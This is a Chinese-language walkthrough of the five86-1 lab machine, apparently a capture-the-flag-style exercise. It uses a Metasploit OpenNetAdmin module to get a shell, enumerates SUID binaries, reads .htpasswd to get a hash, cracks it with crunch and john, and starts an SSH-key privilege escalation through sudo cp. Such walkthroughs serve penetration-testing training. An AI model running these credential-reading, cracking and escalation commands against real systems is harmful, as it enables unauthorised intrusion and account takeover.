## 漏洞利用

启动MSF搜索OpenNetAdmin

```
search OpenNetAdmin
```

![](../Images/c1b3bee331fe790953bc680b9c95e9d2.png)

  

  

应用模块设置相关参数并执行，成功得到shell

```



msf6 > use 0
```

![](../Images/8858d2f420a7a894e87e1f99cda89620.png)

  

  

查看系统内核版本，没有什么可以利用的

```

cat /proc/version
```

![](../Images/96736d3a72b45896335c9ed480063e1a.png)

  

  

查看具有suid权限的程序

```
find / -user root -perm -4000 -print 2>/dev/null
```

![](../Images/c96aacda3155816eac1955cbec74e9db.png)

  

  

看见了exim4这让我想到了DC-8，查看exim的版本

```

www-data@five86-1:/opt/ona/www$ cd /usr/sbin/
```

![](../Images/3a83ae868ceb7f86371200a56bd3cbad.png)

  

  

搜索漏洞发现没有适合这个版本的漏洞

```
searchsploit exim
```

![](../Images/c16f63e71120aec07040c9842af41d8a.png)

  

  

搜索一下有哪些文件是当前账户可以查看到的

```
find / -type f -user www-data
```

![](../Images/a8e7df131b857d5f346072a5016aa902.png)

  

发现/var/www/html/reports/.htaccess我们可以访问

  

查看一下/var/www/html/reports/.htaccess

```
cat /var/www/html/reports/.htaccess
```

![](../Images/4acd8daebf091346c63827223b76603d.png)

  

  

看到了一个文件路径/var/www/.htpasswd，继续查看

```
cat /var/www/.htpasswd
```

![](../Images/48a5607f796f85568bb5e39fc6de7381.png)

  

得到了一个账户和密码的hash值并提示我们`一本标准字典可能会失败，此10个字符的密码使用以下字符集：aefhrt`也就是说标准的字典是无法破解的，密码是由`aefhrt`组成的十个字符

## 获取shell

使用crunch生成一个由`aefhrt`组成长度为十的字典https://www.freebuf.com/sectool/170817.html

```
crunch 10 10 aefhrt > pass
```

![](../Images/4be17d96bbbf42f2a8b9551d548edc76.png)

  

  

使用john破解

```
john --wordlist=pass test.txt
```

![](../Images/ed082a99bc3cdf51fb33c37bcdf5a023.png)

  

  

成功得到密码fatherrrrr，成功登录SSH

![](../Images/2bf4ec2a12c812f53f5113ffd55ad9c0.png)

  

## 提权

查看你用户所具有的权限

```
sudo -l
```

![](../Images/84468baf8a14dd820f98588e4eda4d4d.png)

  

可以看到我们唯一能以jen身份无密码执行的命令是cp

  

在douglas的更目录发现了/.ssh/id\_rsa.pub文件

![](../Images/7eb1d20f7908410a1624f70a7ff99680.png)

  

  

那么我能将id\_rsa.pub文件cp到jen目录下的/.ssh/authorized\_keys文件就能过实现免密登录jen

```


cp id_rsa.pub /tmp
```

![](../Images/03ac92c22777c9cb184564a14e58d34f.png)
